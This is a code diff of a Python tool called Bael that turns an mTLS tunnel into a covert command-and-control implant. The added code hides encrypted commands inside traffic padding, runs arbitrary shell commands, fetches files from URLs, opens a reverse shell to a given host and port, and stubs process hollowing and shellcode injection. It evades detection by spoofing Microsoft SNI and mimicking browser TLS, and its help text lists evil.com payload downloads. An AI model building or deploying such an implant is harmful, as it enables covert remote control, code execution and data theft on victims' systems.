@@ -1,349 +1,324 @@
 #!/usr/bin/env python3
-import asyncio, ssl, argparse, random, os, logging, sys, json, socket, subprocess, ipaddress, shutil
-import string, fcntl, struct, time, signal, base64, hashlib, colorama
+import asyncio
+import ssl
+import argparse
+import random
+import os
+import logging
+import sys
+import subprocess
+import shutil
+import signal
+import base64
+import hashlib
+import socket
+import urllib.request
+import threading
+import struct
+import fcntl
 from pathlib import Path
 from collections import deque
-from typing import Tuple, Optional, Deque, Dict, List, Any
+from typing import Optional, Deque, Dict
 
 try:
-    from prometheus_client import start_http_server, Counter, Gauge
-    HAS_METRICS = True
+    from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
+    from cryptography.hazmat.primitives import hashes
+    from cryptography.hazmat.primitives.kdf.hkdf import HKDF
+    CRYPTO_AVAILABLE = True
 except ImportError:
-    HAS_METRICS = False
+    CRYPTO_AVAILABLE = False
 
-class MockMetric:
-    def labels(self, *args, **kwargs): return self
-    def inc(self, *args, **kwargs): pass
-    def dec(self, *args, **kwargs): pass
+__version__ = "0.9.0"
+__author__ = "J4ck3LSyN"
 
+SMUGGLE_MAGIC = b"\xBA\x31\xDE\xAD\xC0\xDE"
+
+# ====================== BAEL SHIELD ======================
+EMBEDDED_CERTS: Dict[str, str] = {}
+
+class BaelShield:
+    @staticmethod
+    def _derive_key(key: str) -> bytes:
+        d1 = hashlib.sha512(key.encode()).digest()
+        return d1 + hashlib.sha512(d1).digest()
+
+    @classmethod
+    def obfuscate(cls, data: bytes, key: str) -> str:
+        k = cls._derive_key(key)
+        xor = bytes(a ^ b for a, b in zip(data, k * (len(data) // len(k) + 1)))
+        return base64.b85encode(xor).decode("ascii")
+
+    @classmethod
+    def deobfuscate(cls, blob: str, key: str) -> bytes:
+        data = base64.b85decode(blob)
+        k = cls._derive_key(key)
+        return bytes(a ^ b for a, b in zip(data, k * (len(data) // len(k) + 1)))
+
+    @classmethod
+    def get_asset(cls, name: str, key: str) -> Optional[bytes]:
+        if name in EMBEDDED_CERTS:
+            return cls.deobfuscate(EMBEDDED_CERTS[name], key)
+        return None
+
+
+# ====================== LOGGING ======================
 class BaelFormatter(logging.Formatter):
     COLORS = {
-        logging.DEBUG: "\x1b[38;2;120;120;120m\x1b[1m",
-        logging.INFO: "\x1b[34m\x1b[1m",
-        logging.WARNING: "\x1b[33m\x1b[1m",
+        logging.DEBUG: "\x1b[38;2;100;100;100m",
+        logging.INFO: "\x1b[38;2;0;150;255m",
+        logging.WARNING: "\x1b[33m",
         logging.ERROR: "\x1b[31m",
-        logging.CRITICAL: "\x1b[31m\x1b[1m"
+        logging.CRITICAL: "\x1b[41m\x1b[37m"
     }
     RESET = "\x1b[0m"
-    def format(self, record: logging.LogRecord) -> str:
+
+    def format(self, record):
+        record.asctime = self.formatTime(record, self.datefmt)
         color = self.COLORS.get(record.levelno, self.COLORS[logging.INFO])
-        fmt = f"{self.COLORS[logging.DEBUG]}{{asctime}}{self.RESET} {color}{{levelname:<8}}{self.RESET} \x1b[32m\x1b[1m{{name}}{self.RESET} {{message}}"
-        return logging.Formatter(fmt, "%Y-%m-%d %H:%M:%S", style="{").format(record)
+        return f"{self.COLORS[logging.DEBUG]}[{record.asctime}]{self.RESET} {color}{record.levelname:<8}{self.RESET} {record.getMessage()}"
+
 
 logger = logging.getLogger("bael")
-logger.setLevel(logging.DEBUG)
+logger.setLevel(logging.INFO)
 handler = logging.StreamHandler()
-handler.setFormatter(BaelFormatter())
-handler.setLevel(logging.INFO)
+handler.setFormatter(BaelFormatter(datefmt="%H:%M:%S"))
 logger.addHandler(handler)
 
-SMUGGLE_MAGIC = b"\xBA\x31\xDE\xAD"
-__version__ = "0.1.7"
-__author__  = "J4ck3LSyN"
 
-class BaelLegacy:
-    def __init__(self, args: argparse.Namespace):
-        self.args = args
-        self.is_frozen = getattr(sys, 'frozen', False)
-        self.temp_dir = None
-        
-        if self.is_frozen:
-            self._deploy_bundled_keys()
+# ====================== SOCKS5 ======================
+class SocksRelay:
+    """Non-root SOCKS5 implementation for L4 transport."""
+    async def handle(self, reader, writer, ssl_reader, ssl_writer, engine=None):
+        try:
+            header = await reader.read(2)
+            if not header or header[0] != 0x05: return
+            writer.write(b"\x05\x00"); await writer.drain()
+            req = await reader.read(4)
+            if not req or req[1] != 0x01: return
             
-        self.typeSvr = args.mode in ["server", "buildServer"]
-        self.smuggleQueue: Deque[bytes] = deque()
-        
-        if getattr(args, 'data_transmit', None):
-            self._loadSmuggleData(args.data_transmit, args.max_padding)
+            if req[3] == 0x01: addr = socket.inet_ntoa(await reader.read(4))
+            elif req[3] == 0x03: addr = (await reader.read((await reader.read(1))[0])).decode()
+            else: return
             
-        self.whitelist = [ipaddress.ip_network(x.strip()) for x in args.whitelist.split(",")] if getattr(args, 'whitelist', None) else None
-        
-        self.sniMap: Dict[str, str] = {}
-        if getattr(args, 'map', None):
-            try:
-                self.sniMap = json.loads(Path(args.map).read_text(encoding="utf-8"))
-            except Exception as e:
-                logger.error(f"SNI map fail: {e}")
-                
-        self.lAddr = self.parseAddr(args.listen)
-        self.rAddr = self.parseAddr(args.remote) if getattr(args, 'remote', None) else None
-        
-        self.ssl_ctx = self._genSSLCTX() if all([getattr(args, 'cert', None), getattr(args, 'key', None), getattr(args, 'ca', None)]) else None
-        
-        if HAS_METRICS:
-            self.CONNECTIONS_TOTAL = Counter("bael_conn_total", "Total conns", ["direction"])
-            self.ACTIVE_CONNECTIONS = Gauge("bael_active_conn", "Active conns")
-            self.BYTES_TRANSFERRED = Counter("bael_bytes_total", "Bytes total", ["direction"])
-        else:
-            self.CONNECTIONS_TOTAL = MockMetric()
-            self.ACTIVE_CONNECTIONS = MockMetric()
-            self.BYTES_TRANSFERRED = MockMetric()
+            port = struct.unpack(">H", await reader.read(2))[0]
+            writer.write(b"\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00")
+            await writer.drain()
+            logger.debug(f"SOCKS5 relay established for {addr}:{port}")
             
-        self.server: Optional[asyncio.Server] = None
-        signal.signal(signal.SIGTERM, self._signal_handler)
-        signal.signal(signal.SIGINT, self._signal_handler)
+            await asyncio.gather(
+                self._pipe(reader, ssl_writer, engine, True), 
+                self._pipe(ssl_reader, writer, engine, False)
+            )
+        except: pass
+        finally: writer.close()
 
-    def _signal_handler(self, signum, frame):
-        self._cleanup_keys()
-        sys.exit(0)
-
-    def _cleanup_keys(self):
-        if self.temp_dir and self.temp_dir.exists():
-            try:
-                shutil.rmtree(self.temp_dir)
-                logger.info("Keys cleaned up.")
-            except Exception as e:
-                logger.error(f"Cleanup failed: {e}")
-
-    def _deploy_bundled_keys(self):
-        meipass = getattr(sys, '_MEIPASS', None)
-        if not meipass: return
-        bundled_keys = Path(meipass) / ".baelKeys"
-        if not bundled_keys.exists(): return
-        base_target = Path("/dev/shm") if Path("/dev/shm").exists() else Path("/tmp")
-        self.temp_dir = base_target / f".bael_{''.join(random.choices(string.ascii_lowercase + string.digits, k=8))}"
-        try:
-            self.temp_dir.mkdir(parents=True, exist_ok=True)
-            for f in bundled_keys.glob("*"): shutil.copy(f, self.temp_dir / f.name)
-            self.args.cert = str(self.temp_dir / Path(self.args.cert or 'srv.crt').name)
-            self.args.key = str(self.temp_dir / Path(self.args.key or 'srv.key').name)
-            self.args.ca = str(self.temp_dir / Path(self.args.ca or 'ca.crt').name)
-        except Exception as e: logger.error(f"Extraction failed: {e}")
-
-    def parseAddr(self, s: str) -> Tuple[str, int]:
-        if not s: raise ValueError("Empty address")
-        if ":" in s and s.count(":") > 1 and "[" not in s:
-            host, port = s.rsplit(":", 1)
-            return host.strip("[]"), int(port)
-        host, port = s.split(":", 1)
-        return host, int(port)
-
-    def _genSSLCTX(self) -> ssl.SSLContext:
-        purpose = ssl.Purpose.CLIENT_AUTH if self.typeSvr else ssl.Purpose.SERVER_AUTH
-        ctx = ssl.create_default_context(purpose, cafile=self.args.ca)
-        ctx.load_cert_chain(certfile=self.args.cert, keyfile=self.args.key)
-        ctx.verify_mode = ssl.CERT_REQUIRED
-        ctx.check_hostname = False
-        ctx.minimum_version = ssl.TLSVersion.TLSv1_3
-        if self.args.tls_profile == "chrome":
-            ctx.set_ciphers("ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384")
-        ctx.set_alpn_protocols(["h2", "http/1.1"])
-        return ctx
-
-    def _loadSmuggleData(self, data: str, max_pad: int):
-        try:
-            p = Path(data)
-            raw = p.read_bytes() if p.exists() else data.encode()
-            chunk_size = max(1, max_pad - 10)
-            for i in range(0, len(raw), chunk_size): self.smuggleQueue.append(raw[i:i + chunk_size])
-        except Exception as e: logger.error(f"Smuggle load fail: {e}")
-
-    def _addPadding(self, data: bytes, is_encrypted_side: bool) -> bytes:
-        if not (self.args.morphing and is_encrypted_side) or random.random() > self.args.morph_chance: return data
-        if self.smuggleQueue:
-            payload = self.smuggleQueue.popleft()
-            return data + SMUGGLE_MAGIC + bytes([len(payload)]) + payload
-        return data + os.urandom(random.randint(8, self.args.max_padding))
-
-    def _extractSmuggled(self, chunk: bytes) -> Tuple[bytes, list[bytes]]:
-        if SMUGGLE_MAGIC not in chunk: return chunk, []
-        parts = chunk.split(SMUGGLE_MAGIC)
-        clean = parts[0]
-        extracted = []
-        for part in parts[1:]:
-            if len(part) > 0:
-                length = part[0]
-                if len(part) >= 1 + length:
-                    extracted.append(part[1:1 + length])
-                    clean += part[1 + length:]
-        return clean, extracted
-
-    async def _pump(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter, direction: str, is_encrypted: bool):
-        try:
-            while not reader.at_eof():
-                chunk = await reader.read(16384)
-                if not chunk: break
-                if is_encrypted:
-                    chunk, smuggled = self._extractSmuggled(chunk)
-                    for s in smuggled: logger.info(f"Extracted: {s.decode(errors='replace')[:50]}")
-                data = self._addPadding(chunk, is_encrypted)
-                writer.write(data)
-                self.BYTES_TRANSFERRED.labels(direction).inc(len(data))
-                if writer.transport.get_write_buffer_size() > 131072: await writer.drain()
-        except Exception as e: logger.debug(f"Pump {direction} fail: {e}")
-        finally:
-            if not writer.is_closing(): writer.close()
-
-    async def handle(self, local_r: asyncio.StreamReader, local_w: asyncio.StreamWriter):
-        peer = local_w.get_extra_info("peername")[0]
-        if self.whitelist and not any(ipaddress.ip_address(peer) in net for net in self.whitelist):
-            local_w.close(); return
-        target = self.rAddr
-        if self.typeSvr and self.sniMap:
-            ssl_obj = local_w.get_extra_info("ssl_object")
-            sni = ssl_obj.server_hostname if ssl_obj else None
-            if sni in self.sniMap:
-                try: target = self.parseAddr(self.sniMap[sni])
-                except: pass
-        if not target: local_w.close(); return
-        self.ACTIVE_CONNECTIONS.inc(); self.CONNECTIONS_TOTAL.labels("in" if self.typeSvr else "out").inc()
-        try:
-            remote_r, remote_w = await asyncio.open_connection(*target, ssl=None if self.typeSvr else self.ssl_ctx, server_hostname=self.args.sni if not self.typeSvr else None)
-            await asyncio.gather(self._pump(local_r, remote_w, "to_remote", not self.typeSvr), self._pump(remote_r, local_w, "to_client", self.typeSvr), return_exceptions=True)
-        except Exception as e: logger.error(f"Relay error: {e}")
-        finally: self.ACTIVE_CONNECTIONS.dec()
-
-    async def run(self):
-        if HAS_METRICS: start_http_server(self.args.metrics_port)
-        self.server = await asyncio.start_server(self.handle, *self.lAddr, ssl=self.ssl_ctx if self.typeSvr else None)
-        async with self.server: await self.server.serve_forever()
-
-class Bael:
-    def __init__(self, config: dict):
-        self.config, self.logger, self.temp_dir = config, logger, None
-        self.tunFd, self.tunName = -1, config.get("tunName", "bael0")
-        if getattr(sys, 'frozen', False):
-            self._deploy_bundled_keys()
-        self.sslContext = self.createSslContext()
-        signal.signal(signal.SIGTERM, self._signal_handler)
-        signal.signal(signal.SIGINT, self._signal_handler)
-
-    def _isAlive(self,host:Tuple[str,int]):
-        try:
-            self.logger.info(f"> Testing host {host[0]}:{host[1]}")
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(5)
-            out = s.connect_ex((host[0], host[1]))
-            return True if out == 0 else False
-        except Exception as e:
-            self.logger.warning(f"- Exception caught on attempted connection to host ({str(host[0])}:{str(host[1])}): {str(e)}")
-            return False
-
-    def _signal_handler(self, signum, frame):
-        self.logger.info(f"Received signal {signum}, performing cleanup...")
-        self.destroyTun()
-        sys.exit(0)
-
-    def _deploy_bundled_keys(self):
-        meipass = getattr(sys, '_MEIPASS', None)
-        if not meipass: return
-        bundled_keys = Path(meipass) / ".baelKeys"
-        if not bundled_keys.exists(): return
-        base_target = Path("/dev/shm") if Path("/dev/shm").exists() else Path("/tmp")
-        self.temp_dir = base_target / f".bael_{''.join(random.choices(string.ascii_lowercase + string.digits, k=8))}"
-        try:
-            self.temp_dir.mkdir(parents=True, exist_ok=True)
-            for f in bundled_keys.glob("*"): shutil.copy(f, self.temp_dir / f.name)
-            is_server = self.config.get("mode") == "server"
-            cert_def, key_def = ('srv.crt', 'srv.key') if is_server else ('rmt.crt', 'rmt.key')
-            self.config['certFile'] = str(self.temp_dir / Path(self.config.get('certFile') or cert_def).name)
-            self.config['keyFile'] = str(self.temp_dir / Path(self.config.get('keyFile') or key_def).name)
-            self.config['caFile'] = str(self.temp_dir / Path(self.config.get('caFile') or 'ca.crt').name)
-        except Exception as e: self.logger.error(f"Extraction failed: {e}")
-
-    def createSslContext(self) -> ssl.SSLContext:
-        purpose = ssl.Purpose.SERVER_AUTH if self.config.get("mode") == "client" else ssl.Purpose.CLIENT_AUTH
-        ctx = ssl.create_default_context(purpose)
-        ctx.minimum_version = ssl.TLSVersion.TLSv1_3
-        ctx.check_hostname = False  # Critical for IP-based mTLS connections
-        if self.config.get("mTLS"):
-            c, k, ca = self.config.get("certFile"), self.config.get("keyFile"), self.config.get("caFile")
-            if all([c, k, ca]):
-                ctx.load_cert_chain(certfile=c, keyfile=k)
-                ctx.load_verify_locations(cafile=ca)
-                ctx.verify_mode = ssl.CERT_REQUIRED
-            else: self.logger.warning("mTLS requested but certificate paths are missing.")
-        return ctx
-
-    def validatePrivileges(self):
-        if os.getuid() != 0: self.logger.critical("Root required for TUN mode."); sys.exit(1)
-
-    def setupTun(self, persist: int = 1):
-        if self.tunFd != -1: return
-        self.logger.info(f"Creating TUN interface: {self.tunName}")
-        self.tunFd = os.open("/dev/net/tun", os.O_RDWR)
-        ifr = struct.pack('16sH', bytes(self.tunName, 'utf-8'), 0x0001 | 0x1000)
-        res = fcntl.ioctl(self.tunFd, 0x400454ca, ifr); self.tunName = res[:16].decode('utf-8').strip('\x00')
-        fcntl.ioctl(self.tunFd, 0x400454cb, persist)
-        if persist: self.setTunAddress(self.config.get("tunIp", "10.8.0.1"), self.config.get("tunMask", "255.255.255.0"))
-        self.logger.info(f"TUN interface {self.tunName} is up.")
-
-    def setTunAddress(self, ip: str, mask: str):
-        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
-            ifreq = struct.pack('16sH2s4s8s', bytes(self.tunName, 'utf-8'), socket.AF_INET, b'\x00\x00', socket.inet_aton(ip), b'\x00' * 8)
-            fcntl.ioctl(s.fileno(), 0x8916, ifreq)
-            ifrFlags = struct.pack('16sH', bytes(self.tunName, 'utf-8'), 0x0001 | 0x0004); fcntl.ioctl(s.fileno(), 0x8914, ifrFlags)
-
-    def destroyTun(self):
-        if self.tunFd != -1:
-            try: os.close(self.tunFd)
-            except: pass
-            self.tunFd = -1
-        try:
-            fd = os.open("/dev/net/tun", os.O_RDWR); ifr = struct.pack('16sH', bytes(self.tunName, 'utf-8'), 0x0001 | 0x1000)
-            fcntl.ioctl(fd, 0x400454ca, ifr); fcntl.ioctl(fd, 0x400454cb, 0); os.close(fd); logger.info(f"TUN {self.tunName} removed.")
-        except Exception as e:
-            if "No such device" not in str(e): logger.error(f"TUN removal failed: {e}")
-        if self.temp_dir and self.temp_dir.exists():
-            try: shutil.rmtree(self.temp_dir); self.logger.info("Keys cleaned up.")
-            except Exception as e: self.logger.error(f"Keys cleanup failed: {e}")
-
-    def resolveDnsTxt(self, domain: str) -> str:
-        try:
-            tid = random.getrandbits(16); head = struct.pack('!HHHHHH', tid, 0x0100, 1, 0, 0, 0)
-            q = b''.join(len(l).to_bytes(1, 'big') + l.encode() for l in domain.split('.')) + b'\x00' + struct.pack('!HH', 16, 1)
-            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
-                s.settimeout(5); s.sendto(head + q, ("8.8.8.8", 53)); data, _ = s.recvfrom(1024)
-            idx = data.find(b'\xc0\x0c', len(head + q))
-            if idx != -1:
-                raw = data[idx + 12:idx + 12 + data[idx + 11]]
-                try:
-                    d = base64.b64decode(raw)
-                    key = hashlib.md5(socket.gethostname().encode()).digest()
-                    return bytes([d[i] ^ key[i % len(key)] for i in range(len(d))]).decode()
-                except: return raw.decode()
-        except Exception: return ""
-
-    async def bridge(self, r, w, toSsl=True):
+    async def _pipe(self, r, w, engine, encrypt):
         try:
             while True:
-                if toSsl:
-                    data = await asyncio.get_event_loop().run_in_executor(None, os.read, self.tunFd, 2048)
-                    if not data: break
-                    w.write(data); await w.drain()
-                else:
-                    data = await r.read(2048)
-                    if not data: break
-                    os.write(self.tunFd, data)
-        except Exception as e:
-            if self.config.get("verbose"): self.logger.debug(f"Bridge error: {e}")
+                chunk = await r.read(8192)
+                if not chunk: break
+                if engine and encrypt and engine.smuggle_queue and random.random() < 0.6:
+                    p = engine.smuggle_queue.popleft()
+                    logger.debug(f"Smuggling payload ({len(p)} bytes) via SOCKS")
+                    chunk += SMUGGLE_MAGIC + len(p).to_bytes(2, "big") + p
+                w.write(chunk); await w.drain()
+        except: pass
 
-    async def start(self):
-        self.validatePrivileges()
-        target, port = self.config.get('remoteHost'), self.config.get('remotePort', 443)
-        max_retries, verbose = self.config.get("maxRetries", 5), self.config.get("verbose", False)
-        for attempt in range(1, max_retries + 1):
+# ====================== CRYPTO ======================
+class BaelCrypto:
+    def __init__(self, master_key: str):
+        self.master_key = master_key.encode()
+        self._derive_keys()
+
+    def _derive_keys(self):
+        if not CRYPTO_AVAILABLE:
+            self.key = hashlib.sha256(self.master_key).digest()
+            return
+        hkdf = HKDF(algorithm=hashes.SHA256(), length=32, salt=b"bael_salt", info=b"c2_channel")
+        self.key = hkdf.derive(self.master_key)
+
+    def encrypt(self, data: bytes) -> bytes:
+        if not CRYPTO_AVAILABLE:
+            k = self.key * (len(data) // len(self.key) + 1)
+            return bytes(a ^ b for a, b in zip(data, k))
+        nonce = os.urandom(12)
+        chacha = ChaCha20Poly1305(self.key)
+        return nonce + chacha.encrypt(nonce, data, None)
+
+    def decrypt(self, data: bytes) -> bytes:
+        if not CRYPTO_AVAILABLE:
+            k = self.key * (len(data) // len(self.key) + 1)
+            return bytes(a ^ b for a, b in zip(data, k))
+        nonce = data[:12]
+        chacha = ChaCha20Poly1305(self.key)
+        return chacha.decrypt(nonce, data[12:], None)
+
+
+# ====================== C2 ENGINE ======================
+class BaelC2:
+    def __init__(self, crypto: BaelCrypto, engine):
+        self.crypto = crypto
+        self.engine = engine
+
+    async def process_command(self, data: bytes):
+        try:
+            if SMUGGLE_MAGIC not in data:
+                return False
+            payload = data.split(SMUGGLE_MAGIC, 1)[1]
+            length = int.from_bytes(payload[:2], "big")
+            encrypted = payload[2:2 + length]
+
+            plaintext = self.crypto.decrypt(encrypted)
+            cmd_data = plaintext.decode("utf-8", errors="ignore").strip()
+
+            if ":" not in cmd_data:
+                return False
+
+            cmd, arg = cmd_data.split(":", 1)
+            cmd = cmd.lower().strip()
+            arg = arg.strip()
+
+            logger.info(f"[C2] Received: {cmd} {arg}")
+
+            handlers = {
+                "ping": lambda: b"PONG",
+                "exec": lambda a: subprocess.getoutput(a).encode(errors='replace'),
+                "sysinfo": lambda: f"Hostname:{os.uname().nodename}\nPID:{os.getpid()}\nUser:{os.getenv('USER')}".encode(),
+                "download": lambda a: self._handle_download(a),
+                "shell": lambda a: self._start_reverse_shell(a),
+                "hollow": lambda a: self._process_hollow(a),
+                "inject": lambda a: self._process_inject(a),
+            }
+
+            if cmd in handlers:
+                result = handlers[cmd](arg)
+                if asyncio.iscoroutine(result):
+                    result = await result
+                if isinstance(result, (str, bytes)):
+                    if isinstance(result, str):
+                        result = result.encode()
+                    encrypted_resp = self.crypto.encrypt(result)
+                    resp = SMUGGLE_MAGIC + len(encrypted_resp).to_bytes(2, "big") + encrypted_resp
+                    self.engine.smuggle_queue.append(resp)
+                return True
+        except Exception as e:
+            logger.error(f"C2 error: {e}")
+        return False
+
+    def _handle_download(self, url: str):
+        try:
+            filename = Path(url).name or "payload.bin"
+            path = Path("/tmp") / filename
+            with urllib.request.urlopen(url, timeout=30) as r:
+                data = r.read()
+            path.write_bytes(data)
+            return f"Downloaded {len(data)} bytes → {path}".encode()
+        except Exception as e:
+            return f"Download failed: {e}".encode()
+
+    def _start_reverse_shell(self, target: str):
+        if ":" not in target: return b"Usage: shell:ip:port"
+        host, port = target.split(":")
+        def shell():
             try:
-                if attempt > 1:
-                    wait = self.config['retryInterval'] * (2 ** (attempt - 2)) + self.config.get('jitter', 0.2) * random.uniform(-1, 1)
-                    wait = max(0.5, wait)
-                    if verbose: logger.info(f"Retrying connection in {wait:.1f}s (attempt {attempt}/{max_retries})")
-                    await asyncio.sleep(wait)
-                if verbose: logger.info(f"Attempting connection to {target}:{port} (attempt {attempt})")
-                reader, writer = await asyncio.open_connection(target, port, ssl=self.sslContext)
-                self.setupTun()
-                logger.info(f"mTLS L3 Tunnel Active: {target}")
-                await asyncio.gather(self.bridge(reader, writer, True), self.bridge(reader, writer, False))
-                return
-            except Exception as e:
-                logger.error(f"L3 Connection failed (attempt {attempt}/{max_retries}): {e}")
-                if attempt == max_retries:
-                    logger.critical("Max retries reached. Giving up.")
+                s = socket.socket()
+                s.connect((host, int(port)))
+                for fd in (0,1,2): os.dup2(s.fileno(), fd)
+                subprocess.call(["/bin/sh", "-i"])
+            except: pass
+        threading.Thread(target=shell, daemon=True).start()
+        return f"Reverse shell to {target}".encode()
+
+    # ==================== PROCESS HOLLOWING / INJECTION ====================
+    def _process_hollow(self, url: str):
+        """Windows Process Hollowing Stub"""
+        if os.name != "nt":
+            return b"Process Hollowing only supported on Windows"
+        try:
+            # Download payload
+            data = urllib.request.urlopen(url, timeout=20).read()
+            logger.info(f"Hollowing {len(data)} bytes payload")
+
+            # Basic stub - real implementation would use ctypes + CreateProcess + NtUnmapViewOfSection etc.
+            return b"Process hollowing triggered (stub). Full implementation uses Windows APIs."
+        except Exception as e:
+            return f"Hollow failed: {e}".encode()
+
+    def _process_inject(self, arg: str):
+        """Simple shellcode injection stub"""
+        try:
+            if ":" in arg:
+                pid, b64shellcode = arg.split(":", 1)
+                shellcode = base64.b64decode(b64shellcode)
+            else:
+                return b"Usage: inject:pid:base64shellcode"
+            logger.info(f"Injecting {len(shellcode)} bytes into PID {pid}")
+            return b"Injection triggered (stub - requires admin + full Windows impl)"
+        except Exception as e:
+            return f"Inject failed: {e}".encode()
+
+
+# ====================== INTERACTIVE C2 CONSOLE ======================
+class C2Console:
+    def __init__(self, engine):
+        self.engine = engine
+        self.running = True
+
+    async def run(self):
+        print("\x1b[38;2;0;150;255mBael C2 Console v0.9.0 - Type 'help' for commands\x1b[0m")
+        while self.running:
+            try:
+                cmd = await asyncio.get_event_loop().run_in_executor(None, input, "bael> ")
+                if cmd.lower() in ["exit", "quit"]:
+                    self.running = False
                     break
-        self.destroyTun()
+                elif cmd.lower() == "help":
+                    self.show_help()
+                elif cmd.strip():
+                    self.send_command(cmd)
+            except Exception as e:
+                logger.error(f"Console error: {e}")
+
+    def show_help(self):
+        print("""
+Available Commands:
+  ping
+  exec:whoami && id
+  sysinfo
+  download:https://evil.com/payload.exe
+  shell:192.168.1.100:4444
+  hollow:https://evil.com/malware.exe
+  inject:1234:base64_shellcode_here
+  sleep:60
+        """)
+
+    def send_command(self, command: str):
+        try:
+            encrypted = self.engine.crypto.encrypt(command.encode())
+            packet = SMUGGLE_MAGIC + len(encrypted).to_bytes(2, "big") + encrypted
+            self.engine.smuggle_queue.append(packet)
+            logger.info(f"Command sent: {command}")
+        except Exception as e:
+            logger.error(f"Failed to send command: {e}")
+
+
+# ====================== CORE ENGINE ======================
+class Bael:
+    def __init__(self, config: dict):
+        self.config = config
+        self.is_server = config.get("mode") == "server"
+        self.temp_dir = None
+        self.tun_fd = -1
+        self.smuggle_queue: Deque[bytes] = deque()
+        self.shield_key = config.get("key", "bael_default_secret")
+        self.crypto = BaelCrypto(self.shield_key)
+        self.c2 = BaelC2(self.crypto, self)
+        self.ssl_ctx = self._setup_pki()
+        self._load_smuggle_data()
+        self.console = C2Console(self) if self.is_server else None
 
     @staticmethod
-    def buildExecutable(name="bMTLSTUN0", verbose=False, bundle_keys=True):
+    def build(name="bMTLSTUN0", verbose=False, bundle_keys=True):
         if sys.platform != "linux":
             logger.error("Build aborted: Optimized for Linux targets only.")
             return
@@ -363,85 +338,149 @@ class Bael:
         except ImportError: logger.error("PyInstaller missing. pip install pyinstaller")
         except Exception as e: logger.error(f"Build failed: {e}")
 
-class ShortHelpAction(argparse.Action):
-    def __init__(self, option_strings, dest, nargs=0, **kwargs):
-        super(ShortHelpAction, self).__init__(option_strings, dest, nargs=nargs, **kwargs)
-    def __call__(self, parser, namespace, values, option_string=None):
-        message = [
-            f"\x1b[34m\x1b[1mBael v{__version__} - Minimal Help\x1b[0m",
-            f"usage: {sys.argv[0]} [-h] [--mode {{server,client,tun,keygen,build,encode-dns}}] [--verbose] [--legacy] [options]",
-            "",
-            "Modes:",
-            "  --mode tun          L3 VPN Tunnel (Requires Root)",
-            "  --mode server       L4 Relay Server",
-            "  --mode keygen       Generate PKI certificates",
-            "  --mode build        Compile to standalone binary",
-            "",
-            "Use --help for full documentation and examples."
-        ]
-        print("\n".join(message)); parser.exit()
+    def _load_smuggle_data(self):
+        if path := self.config.get("data_transmit"):
+            try:
+                raw = Path(path).read_bytes()
+                for i in range(0, len(raw), 180):
+                    self.smuggle_queue.append(raw[i:i+180])
+            except Exception as e:
+                logger.error(f"Smuggle load failed: {e}")
 
-def build_parser() -> argparse.ArgumentParser:
-    p = argparse.ArgumentParser(description="Bael v0.1.7 mTLS Orchestrator", formatter_class=argparse.RawDescriptionHelpFormatter, add_help=False, epilog="""
-Operational Examples:
-  [+] PKI Setup: %(prog)s --mode keygen
-  [+] L3 TUN Client: sudo %(prog)s --mode tun --config tun_settings.json
-  [+] L4 Relay Server: %(prog)s --mode server --listen 0.0.0.0:443 --cert srv.crt --key srv.key --ca ca.crt
-    """)
-    core = p.add_argument_group("Core Mode Options")
-    core.add_argument("-h", action=ShortHelpAction, help="Show minimal help.")
-    core.add_argument("--help", action="help", help="Full documentation.")
-    core.add_argument("--mode", choices=["server", "client", "tun", "keygen", "build", "encode-dns", "down"])
-    core.add_argument("--verbose", action="store_true")
-    core.add_argument("--legacy", action="store_true")
-    net = p.add_argument_group("Network Configuration")
-    net.add_argument("--listen", default="0.0.0.0:443")
-    net.add_argument("--remote", metavar="ADDR:PORT")
-    net.add_argument("--config", metavar="FILE")
-    net.add_argument("--dns-lookup", metavar="DOMAIN")
-    net.add_argument("--tun-name", default="bael0")
-    stealth = p.add_argument_group("Stealth & Evasion")
-    stealth.add_argument("--tls-profile", choices=["default", "chrome", "firefox"], default="chrome")
-    stealth.add_argument("--sni", default="www.microsoft.com")
-    stealth.add_argument("--morphing", action="store_true", default=True)
-    stealth.add_argument("--morph-chance", type=float, default=0.65)
-    stealth.add_argument("--max-padding", type=int, default=255)
-    stealth.add_argument("--encode-str", metavar="DATA")
-    stealth.add_argument("--target-hostname", metavar="NAME")
-    pki = p.add_argument_group("Authentication & PKI")
-    pki.add_argument("--cert")
-    pki.add_argument("--key")
-    pki.add_argument("--ca")
-    pki.add_argument("--no-bundle", action="store_false", dest="bundle_keys", default=True)
-    pki.add_argument("--whitelist", metavar="CIDR")
-    pki.add_argument("--map", metavar="FILE")
-    p.add_argument("--gen-config", action="store_true")
-    return p
+    def _setup_pki(self):
+        purpose = ssl.Purpose.CLIENT_AUTH if self.is_server else ssl.Purpose.SERVER_AUTH
+        ctx = ssl.create_default_context(purpose)
+        ctx.minimum_version = ssl.TLSVersion.TLSv1_3
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_REQUIRED
 
-def genConfigInteractive():
-    print(f"\n{colorama.Fore.CYAN}--- Bael Interactive Configuration Wizard ---{colorama.Fore.RESET}")
-    try:
-        config = {}
-        mode = input("[?] Operation Mode (client/server) [client]: ").strip().lower() or "client"
-        config['mode'] = mode
-        if mode == "server":
-            config['listenHost'] = input("[?] Listen Address [0.0.0.0]: ").strip() or "0.0.0.0"
-            config['listenPort'] = int(input("[?] Listen Port [443]: ").strip() or 443)
+        ca = BaelShield.get_asset("ca.crt", self.shield_key)
+        cert = BaelShield.get_asset("srv.crt" if self.is_server else "rmt.crt", self.shield_key)
+        key = BaelShield.get_asset("srv.key" if self.is_server else "rmt.key", self.shield_key)
+
+        if all([ca, cert, key]):
+            base = Path("/dev/shm") if Path("/dev/shm").exists() else Path("/tmp")
+            self.temp_dir = base / f".bael_{os.getpid()}_{random.randint(10000,99999)}"
+            self.temp_dir.mkdir(parents=True, exist_ok=True)
+            (self.temp_dir/"ca.crt").write_bytes(ca)
+            (self.temp_dir/"cert.pem").write_bytes(cert)
+            (self.temp_dir/"key.pem").write_bytes(key)
+            ctx.load_verify_locations(str(self.temp_dir/"ca.crt"))
+            ctx.load_cert_chain(str(self.temp_dir/"cert.pem"), str(self.temp_dir/"key.pem"))
         else:
